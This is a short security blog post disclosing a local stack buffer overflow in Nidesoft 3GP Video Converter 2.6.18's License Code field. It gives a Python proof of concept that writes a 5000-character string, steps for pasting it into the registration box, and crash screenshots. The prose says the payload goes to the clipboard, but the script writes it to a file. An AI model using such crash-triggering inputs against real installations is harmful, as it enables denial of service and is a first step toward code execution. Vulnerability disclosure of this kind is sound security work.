---
layout: post
title: Nidesoft 3GP Video Converter 2.6.18 - Local Stack Buffer Overflow
date: 2020-04-21 23:22:00
categories: posts
comments: false
en: true
---

 Nidesoft 3GP Video Converter 2.6.18 suffers from a Vanilla Stack Buffer Overflow when a long string is parsed through the parameter "License" within the Registration.
 
 Initial PoC:
 
 ```term
 import struct

buffer = "A" * 5000

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
 ```
 
Once the exploit is run, the payload is copied into the clipboard.
In order to exploit the application, simply launch it, and the registration will appear. After such event is produced, simply paste the clipboard into the paramter "License Code", and click "OK" on the box that appears later on.

![](/assets/img/Findings12/1.png)

![](/assets/img/Findings12/2.png)

#### Crash I

![](/assets/img/Findings12/3.png)
